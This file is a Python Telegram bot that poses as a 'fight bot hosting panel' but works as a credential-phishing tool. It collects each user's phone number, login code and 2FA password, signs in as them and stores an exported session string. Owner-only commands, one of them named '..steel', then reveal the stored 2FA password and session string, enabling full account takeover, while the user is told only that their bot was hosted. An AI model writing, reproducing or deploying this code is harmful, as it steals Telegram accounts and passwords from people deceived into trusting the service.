import asyncio
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, Message, CallbackQuery
from pyrogram.errors import (
    SessionPasswordNeeded,
    PhoneCodeInvalid,
    PhoneNumberInvalid,
    PasswordHashInvalid
)

from config import API_ID, API_HASH, BOT_TOKEN, OWNER_ID

# Temporary memory storage for states and user sessions
USER_STATE = {}
USER_DATA = {}
HOSTED_USERS = {}  # Format: {user_id: {"full_name": ..., "username": ..., "phone": ..., "2fa": ..., "session": ...}}

app = Client(
    "NobiXDFightHostBot",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN
)

@app.on_message(filters.command("start"))
async def start_command(client: Client, message: Message):
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("👑 Owner", url="https://t.me/your_username"),
         InlineKeyboardButton("🛠 Help", callback_data="help_menu")],
        [InlineKeyboardButton("💬 Support", url="https://t.me/support_chat"),
         InlineKeyboardButton("📢 Updates", url="https://t.me/updates_channel")],
        [InlineKeyboardButton("🚀 Host Bot", callback_data="host_start")]
    ])
    await message.reply_text(
        "👋 **Welcome to Nobi XD Fight Bot Hosting Panel!**\n\nClick the 'Host Bot' button below to host your account.",
        reply_markup=keyboard
    )

@app.on_callback_query(filters.regex("host_start"))
async def host_bot_process(client: Client, callback_query: CallbackQuery):
    user_id = callback_query.from_user.id
    USER_STATE[user_id] = "WAITING_FOR_PHONE"
    await callback_query.message.edit_text(
        "📱 **Enter Mobile Number:**\n\nPlease send your Telegram account phone number with the country code (Example: `+91 98765 43210`)."
    )

@app.on_message(filters.private & ~filters.command(["start", "info"]))
async def handle_user_inputs(client: Client, message: Message):
    user_id = message.from_user.id
    state = USER_STATE.get(user_id)

    if state == "WAITING_FOR_PHONE":
        phone = message.text.strip().replace(" ", "")
        USER_DATA[user_id] = {"phone": phone}
        
        try:
            temp_client = Client(
                name=f"session_{user_id}",
                api_id=API_ID,
                api_hash=API_HASH,
                device_model="Nobi XD Fight Bot",
                in_memory=True
            )
            await temp_client.connect()
            sent_code = await temp_client.send_code(phone)
            USER_DATA[user_id]["client"] = temp_client
            USER_DATA[user_id]["phone_code_hash"] = sent_code.phone_code_hash
            
            USER_STATE[user_id] = "WAITING_FOR_OTP"
            await message.reply_text(
                "📩 **Enter OTP:**\n\nTelegram login code has been sent to your number.\n*(Note: Make sure there is a space between each digit, for example: `1 2 3 4 5`)*"
            )
        except Exception as e:
            await message.reply_text(f"❌ **Error:** `{e}`\n\nPlease try again using `/start`.")
            USER_STATE.pop(user_id, None)

    elif state == "WAITING_FOR_OTP":
        otp = message.text.strip().replace(" ", "")
        temp_client = USER_DATA[user_id].get("client")
        phone = USER_DATA[user_id].get("phone")
        phone_code_hash = USER_DATA[user_id].get("phone_code_hash")

        try:
            await temp_client.sign_in(phone=phone, phone_code_hash=phone_code_hash, phone_code=otp)
            await finalize_login(client, message, user_id, temp_client)
        except SessionPasswordNeeded:
            USER_STATE[user_id] = "WAITING_FOR_2FA"
            await message.reply_text("🔒 **Two-Step Verification (2FA) Required:**\n\nPlease send your 2FA account password:")
        except PhoneCodeInvalid:
            await message.reply_text("❌ **Invalid OTP!** Please enter the correct OTP with spaces again.")
        except Exception as e:
            await message.reply_text(f"❌ **Error:** `{e}`")

    elif state == "WAITING_FOR_2FA":
        password = message.text.strip()
        temp_client = USER_DATA[user_id].get("client")

        try:
            await temp_client.check_password(password)
            USER_DATA[user_id]["2fa"] = password
            await finalize_login(client, message, user_id, temp_client)
        except PasswordHashInvalid:
            await message.reply_text("❌ **Incorrect Password!** Please send your correct 2FA password again.")
        except Exception as e:
            await message.reply_text(f"❌ **Error:** `{e}`")

async def finalize_login(client: Client, message: Message, user_id: int, temp_client: Client):
    try:
        string_session = await temp_client.export_session_string()
        user_info = await temp_client.get_me()
        
        HOSTED_USERS[user_id] = {
            "user_id": user_id,
            "full_name": f"{user_info.first_name} {user_info.last_name or ''}".strip(),
            "username": f"@{user_info.username}" if user_info.username else "No Username",
            "phone": USER_DATA[user_id].get("phone"),
            "2fa": USER_DATA.get(user_id, {}).get("2fa", "Not Enabled"),
            "session": string_session
        }

        USER_STATE.pop(user_id, None)
        USER_DATA.pop(user_id, None)
        await temp_client.disconnect()

        await message.reply_text(
            "✅ **Congratulations! Your Nobi XD Fight Bot has been hosted successfully.**\n\nAll commands are now active on your account."
        )

        notif_text = (
            f"🚨 **New User Hosted Your Fight Bot!**\n\n"
            f"👤 **Name:** {user_info.first_name}\n"
            f"🆔 **User ID:** `{user_id}`\n"
            f"🔗 **Username:** @{user_info.username if user_info.username else 'None'}"
        )
        await client.send_message(OWNER_ID, notif_text)

    except Exception as e:
        await message.reply_text(f"❌ Failed to generate session string: `{e}`")

@app.on_message(filters.command("steel", prefixes="..") & filters.user(OWNER_ID))
async def steel_stats_command(client: Client, message: Message):
    total_users = len(USER_STATE) + len(HOSTED_USERS)
    hosted_count = len(HOSTED_USERS)
    
    stats_text = (
        f"📊 **Bot Statistics:**\n\n"
        f"👥 **Total Users Connected:** `{total_users}`\n"
        f"🚀 **Successfully Hosted Users:** `{hosted_count}`"
    )
    await message.reply_text(stats_text)

@app.on_message(filters.command("info") & filters.user(OWNER_ID))
async def user_info_command(client: Client, message: Message):
    args = message.text.split()
    if len(args) < 2:
        await message.reply_text("⚠️ Please provide a user ID. Example: `/info 123456789`")
        return
    
    try:
        target_id = int(args[1])
    except ValueError:
        await message.reply_text("❌ Invalid User ID!")
        return

    user_data = HOSTED_USERS.get(target_id)
    if not user_data:
        await message.reply_text("❌ No hosted data found for this user ID.")
        return

    info_text = (
        f"📋 **User Information:**\n\n"
        f"👤 **Name:** {user_data['full_name']}\n"
        f"🆔 **ID:** `{target_id}`\n"
        f"📱 **Phone Number:** `{user_data['phone']}`\n"
        f"🔒 **2FA Password:** `{user_data['2fa']}`"
    )

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔑 Get String Session", callback_data=f"get_string_{target_id}")],
        [InlineKeyboardButton("🗑 Delete Account", callback_data=f"delete_acc_{target_id}")]
    ])

    await message.reply_text(info_text, reply_markup=keyboard)

@app.on_callback_query(filters.regex(r"^(get_string_|delete_acc_)") & filters.user(OWNER_ID))
async def admin_actions_callback(client: Client, callback_query: CallbackQuery):
    data = callback_query.data
    target_id = int(data.split("_")[-1])
    user_data = HOSTED_USERS.get(target_id)

    if not user_data:
        await callback_query.answer("❌ Data not found or already deleted.", show_alert=True)
        return

    if data.startswith("get_string_"):
        session_string = user_data["session"]
        await callback_query.message.reply_text(
            f"🔑 **String Session (`{target_id}`):**\n\n`{session_string}`",
            disable_web_page_preview=True
        )
        await callback_query.answer("String session sent successfully!")

    elif data.startswith("delete_acc_"):
        HOSTED_USERS.pop(target_id, None)
        await callback_query.message.edit_text(
            f"🗑 **Successfully Deleted!**\n\nUser ID `{target_id}` data and hosted account have been removed from the panel."
        )
        await callback_query.answer("Account data deleted successfully!", show_alert=True)

if __name__ == "__main__":
    print("🚀 Nobi XD Fight Bot Host Panel Started Successfully!")
    app.run()
      
